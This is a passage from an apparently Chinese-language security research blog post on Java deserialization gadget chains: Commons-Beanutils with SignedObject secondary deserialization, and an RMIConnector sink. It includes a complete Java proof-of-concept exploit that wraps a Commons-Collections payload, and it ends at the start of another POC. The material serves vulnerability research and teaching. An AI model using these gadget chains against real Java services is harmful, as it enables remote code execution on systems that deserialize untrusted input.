#ABB2BF\">(</span><span style=\"color: #E5C07B\">bs</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">toByteArray</span><span style=\"color: #ABB2BF\">());</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">String</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">s</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">String</span><span style=\"color: #ABB2BF\">(encode);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">System</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #E5C07B\">out</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">println</span><span style=\"color: #ABB2BF\">(s);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">System</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #E5C07B\">out</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">println</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">s</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">length</span><span style=\"color: #ABB2BF\">());</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #E06C75\">    </span><span style=\"color: #C678DD\">private</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">static</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">void</span><span style=\"color: #61AFEF\"> setFieldValue</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75; font-style: italic\">obj</span><span style=\"color: #ABB2BF\">, </span><span style=\"color: #E5C07B\">String</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75; font-style: italic\">field</span><span style=\"color: #ABB2BF\">, </span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75; font-style: italic\">arg</span><span style=\"color: #ABB2BF\">)</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">throws</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #E5C07B\">Exception</span><span style=\"color: #ABB2BF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">Field</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">f</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">obj</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">getClass</span><span style=\"color: #ABB2BF\">().</span><span style=\"color: #61AFEF\">getDeclaredField</span><span style=\"color: #ABB2BF\">(field);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">f</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">setAccessible</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #D19A66\">true</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">f</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">set</span><span style=\"color: #ABB2BF\">(obj, arg);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">&#125;</span></span>\n<span class=\"line\"></span></code></pre></div><p>CCEXP 的生成内容是一样的<br>还有其他的关于 getter 方法调用的途径，下面分析 commons-beanutils 也就是 CB 链的结合</p>\n<h2 id=\"Commons-Beanutils\"><a href=\"#Commons-Beanutils\" class=\"headerlink\" title=\"Commons-Beanutils\"></a>Commons-Beanutils</h2><p>CB 链的 compare 方法中有获取对象属性值的操作，本质还是通过 get 方法获取的，o1 和 o2 都是直接通过传参形式传入的，可控。<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1717460198959-58a0dcc4-feb8-43b6-9c2a-438fbab3e68e.png#averageHue=%2328292b&clientId=ua4b4459f-fa6f-4&from=paste&height=526&id=tbMwq&originHeight=987&originWidth=1724&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=326377&status=done&style=none&taskId=ue0d028d9-24a2-4147-a96b-23511bcfb70&title=&width=919.4666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>最终 sink 点在 getSimpleProperty 的 invokeMethod 中<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1717481065856-30f27a56-8775-40f9-881f-67532142fc34.png#averageHue=%23282a2b&clientId=u979b0b46-764b-4&from=paste&height=602&id=u12080cd6&originHeight=1128&originWidth=1323&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=332795&status=done&style=none&taskId=ua7083b4a-cd26-477f-8801-9159f8ca6dd&title=&width=705.6\" referrerpolicy=\"no-referrer\" alt=\"image.png\"></p>\n<p>那么这里还是按照 CC2 和 CC4 的思路，通过优先队列 PriorityQueque 的反序列化入口。但是有一个地方需要注意：最终调用siftDownUsingComparator 到时，我们必须要让 comparator 等于 BeanComparator,并且要将 x 变量赋值为 SignedObject。这里为什么不选择上一个 comparator 呢？c 变量赋值很好实现，我们反射写 queue 即可，但其实我们在 <code>if (right &lt; size</code> 的时候就不满足条件了，这里 size 我们不能通过 add 方法往Queque 里面填元素实现递增，序列化的时候会报错数组越界<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1717464502461-19d8c526-05c8-4256-9427-4385ac05fc4c.png#averageHue=%2328292b&clientId=u8020a5a4-a549-4&from=paste&height=381&id=ua3ef7e88&originHeight=714&originWidth=1627&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=231278&status=done&style=none&taskId=u428017a0-ae2f-434e-89c6-f464641b348&title=&width=867.7333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>所以只能够通过第二个 comparator 的 comapare 实现，反射写入 x 值即可。x 怎么赋值进去呢？观察下面的变量传递<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1717464704407-618524b2-facc-48e6-9036-d17b1d3cc228.png#averageHue=%232a2b2d&clientId=u8020a5a4-a549-4&from=paste&height=117&id=u343db447&originHeight=219&originWidth=1307&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=77506&status=done&style=none&taskId=u230c45a1-9d1c-47c6-9a35-dc9b3c5a2c0&title=&width=697.0666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1717464713522-500b586a-3d78-4301-b8f2-586022d73a4c.png#averageHue=%232a2b2c&clientId=u8020a5a4-a549-4&from=paste&height=170&id=ud7ad3052&originHeight=319&originWidth=1091&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=97888&status=done&style=none&taskId=ub0146d8e-c813-4bcf-b4cd-f9df033f8a0&title=&width=581.8666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>这里我们反射写入 <code>queue[SignedObject,null]</code> 即可，queue 属性值本身就是一个数组<br>还有一个需要注意的点，beanComparator 的调用流程，最终调用哪个的 getter 取决于<code>property</code> 属性值，所以还要反射写入<code>property=object</code>，之后才能调用到 getObject<br>POC 如下：</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki one-dark-pro\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #C678DD\">package</span><span style=\"color: #E06C75\"> </span><span style=\"color: #C678DD\">org.example.</span><span style=\"color: #FFFFFF\">S</span><span style=\"color: #C678DD\">igned</span><span style=\"color: #FFFFFF\">O</span><span style=\"color: #C678DD\">bject</span><span style=\"color: #FFFFFF\">POC</span><span style=\"color: #C678DD\">s</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">org.apache.commons.beanutils.BeanComparator</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">org.apache.commons.collections.comparators.TransformingComparator</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">org.apache.commons.collections.functors.ConstantTransformer</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">org.example.CCEXP</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.io.ByteArrayInputStream</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.io.ByteArrayOutputStream</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.io.ObjectInputStream</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.io.ObjectOutputStream</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.lang.reflect.Field</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.security.KeyPair</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.security.KeyPairGenerator</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.security.Signature</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.security.SignedObject</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.util.Base64</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.util.PriorityQueue</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C678DD\">public</span><span style=\"color: #E06C75\"> </span><span style=\"color: #C678DD\">class</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">SignedObjectPOC3</span><span style=\"color: #E06C75\"> </span><span style=\"color: #ABB2BF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #E06C75\">    </span><span style=\"color: #C678DD\">public</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">static</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">void</span><span style=\"color: #61AFEF\"> main</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">String</span><span style=\"color: #ABB2BF\">[] </span><span style=\"color: #E06C75; font-style: italic\">args</span><span style=\"color: #ABB2BF\">)</span><span style=\"color: #C678DD\">throws</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #E5C07B\">Exception</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #ABB2BF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #7F848E; font-style: italic\">//获取CC6的入口HashMap</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">CCEXP</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">ccexp</span><span style=\"color: #56B6C2\">=</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">CCEXP</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #7F848E; font-style: italic\">//SignedObject的初始化，涉及PrivateKey以及Signature对象的处理,signedObject中对于此项的设置我们可以参考Java.security.interface中的几个密钥接口，这里的初始化赋值就是在赋值何种格式的密钥</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">KeyPairGenerator</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">kpg</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">KeyPairGenerator</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">getInstance</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #98C379\">&quot;DSA&quot;</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">kpg</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">initialize</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #D19A66\">1024</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">KeyPair</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">kp</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">kpg</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">generateKeyPair</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">SignedObject</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">signedObject</span><span style=\"color: #56B6C2\">=</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">SignedObject</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">ccexp</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">getPayloadCC11</span><span style=\"color: #ABB2BF\">(), </span><span style=\"color: #E5C07B\">kp</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">getPrivate</span><span style=\"color: #ABB2BF\">(), </span><span style=\"color: #E5C07B\">Signature</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">getInstance</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #98C379\">&quot;DSA&quot;</span><span style=\"color: #ABB2BF\">));</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #7F848E; font-style: italic\">//使PriorityQueue的comparator变量赋值为beanComparator，siftDownUsingComparator中才会调用到beanComparator.comparator</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">BeanComparator</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">beanComparator</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">BeanComparator</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">PriorityQueue</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">priorityQueue</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">PriorityQueue</span><span style=\"color: #ABB2BF\">&lt;&gt;(beanComparator);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">priorityQueue</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">add</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #D19A66\">1</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">priorityQueue</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">add</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #D19A66\">2</span><span style=\"color: #ABB2BF\">);</span><span style=\"color: #7F848E; font-style: italic\">//执行add操作是为了heapify()执行时的for循环能够进入， size算出来要大于等于1</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #61AFEF\">setFieldValue</span><span style=\"color: #ABB2BF\">(beanComparator,</span><span style=\"color: #98C379\">&quot;property&quot;</span><span style=\"color: #ABB2BF\">,</span><span style=\"color: #98C379\">&quot;object&quot;</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #61AFEF\">setFieldValue</span><span style=\"color: #ABB2BF\">(priorityQueue,</span><span style=\"color: #98C379\">&quot;queue&quot;</span><span style=\"color: #ABB2BF\">,</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\">[]&#123;signedObject,</span><span style=\"color: #D19A66\">null</span><span style=\"color: #ABB2BF\">&#125;);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #61AFEF\">unSerial</span><span style=\"color: #ABB2BF\">(priorityQueue);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">    &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #E06C75\">    </span><span style=\"color: #C678DD\">private</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">static</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #E5C07B\">ByteArrayOutputStream</span><span style=\"color: #61AFEF\"> unSerial</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75; font-style: italic\">o</span><span style=\"color: #ABB2BF\">)</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">throws</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #E5C07B\">Exception</span><span style=\"color: #ABB2BF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">ByteArrayOutputStream</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">bs</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">ByteArrayOutputStream</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">ObjectOutputStream</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">out</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">ObjectOutputStream</span><span style=\"color: #ABB2BF\">(bs);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">out</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">writeObject</span><span style=\"color: #ABB2BF\">(o);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">ObjectInputStream</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">in</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">ObjectInputStream</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">ByteArrayInputStream</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">bs</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">toByteArray</span><span style=\"color: #ABB2BF\">()));</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">in</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">readObject</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">in</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">close</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #C678DD\">return</span><span style=\"color: #ABB2BF\"> bs;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #E06C75\">    </span><span style=\"color: #C678DD\">private</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">static</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">void</span><span style=\"color: #61AFEF\"> Base64Encode</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">ByteArrayOutputStream</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75; font-style: italic\">bs</span><span style=\"color: #ABB2BF\">)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #C678DD\">byte</span><span style=\"color: #ABB2BF\">[] </span><span style=\"color: #E06C75\">encode</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">Base64</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">getEncoder</span><span style=\"color: #ABB2BF\">().</span><span style=\"color: #61AFEF\">encode</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">bs</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">toByteArray</span><span style=\"color: #ABB2BF\">());</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">String</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">s</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">String</span><span style=\"color: #ABB2BF\">(encode);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">System</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #E5C07B\">out</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">println</span><span style=\"color: #ABB2BF\">(s);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">System</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #E5C07B\">out</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">println</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">s</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">length</span><span style=\"color: #ABB2BF\">());</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #E06C75\">    </span><span style=\"color: #C678DD\">private</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">static</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">void</span><span style=\"color: #61AFEF\"> setFieldValue</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75; font-style: italic\">obj</span><span style=\"color: #ABB2BF\">, </span><span style=\"color: #E5C07B\">String</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75; font-style: italic\">field</span><span style=\"color: #ABB2BF\">, </span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75; font-style: italic\">arg</span><span style=\"color: #ABB2BF\">)</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">throws</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #E5C07B\">Exception</span><span style=\"color: #ABB2BF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">Field</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">f</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">obj</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">getClass</span><span style=\"color: #ABB2BF\">().</span><span style=\"color: #61AFEF\">getDeclaredField</span><span style=\"color: #ABB2BF\">(field);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">f</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">setAccessible</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #D19A66\">true</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">f</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">set</span><span style=\"color: #ABB2BF\">(obj, arg);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">&#125;</span></span>\n<span class=\"line\"></span></code></pre></div><h1 id=\"RmiConnector\"><a href=\"#RmiConnector\" class=\"headerlink\" title=\"RmiConnector\"></a>RmiConnector</h1><p>sink 点在 RmiConnector 的 <code>findRMIServerJRMP</code>中，具体的反序列化流是通过传递序列化字符串 base64，然后对其解码，作为 ByteArray 输入流，然后判断是否有 loader，没有 loader 就直接创建对象输入流进行 readObject<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1717468777824-5ba84405-4885-47f5-8bc0-129d281c6806.png#averageHue=%2328292b&clientId=u979b0b46-764b-4&from=paste&height=507&id=ua13a9cc4&originHeight=951&originWidth=1841&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=340107&status=done&style=none&taskId=uc969b8fe-7f93-47ae-b250-e3a90af369d&title=&width=981.8666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>往上寻找其调用<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1717469004753-e11d98ac-5683-4323-965d-e642d53e5ebc.png#averageHue=%232a2d2f&clientId=u979b0b46-764b-4&from=paste&height=365&id=u595d9dd5&originHeight=685&originWidth=1489&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=279531&status=done&style=none&taskId=u79b6238e-7d09-48a0-bbc7-679a97c0cab&title=&width=794.1333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>这里要进入 findRMIServerJRMP 就必须满足<code>if (path.startsWith(&quot;/stub/&quot;))</code>的情况。path 是通过 directoryURL 传入的，还是得向上寻找<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1717469169943-6d1485d5-4ad3-40df-8b9d-f30f669f4eb4.png#averageHue=%2328292b&clientId=u979b0b46-764b-4&from=paste&height=517&id=u34b183bd&originHeight=970&originWidth=1288&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=309845&status=done&style=none&taskId=ucaa13410-a2dc-483b-a0bb-538cb05940d&title=&width=686.9333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>这里就能够找到directoryURL 的具体传值了，我们能够通过反射写入 jmxServiceURL 的 urlPath 任意控制directoryURL，那 if 判断就很好过了，但是 base64 编码的序列化字节码如何传递呢？其实也是通过<br>jmxServiceURL 的 urlPath。我们观察<code>findRMIServerJRMP(path.substring(6,end), environment, isIiop);</code>base64 字符串是通过截取后六位的字符传入的，前六位是什么—-<code>/stub/</code>，所以我们反射写入如的时候只需要在<code>/stub/</code>之后添加我们的 base64 字节码即可。最后用 InvokerTransformer 调用即可，也就是 CC 入口或者其他的 readObject 入口填充，最终流入InvokerTransformer 的时候具体 invoke 的对象是 RMIConnector，方法是 connect<br>POC 如下：</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki one-dark-pro\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span 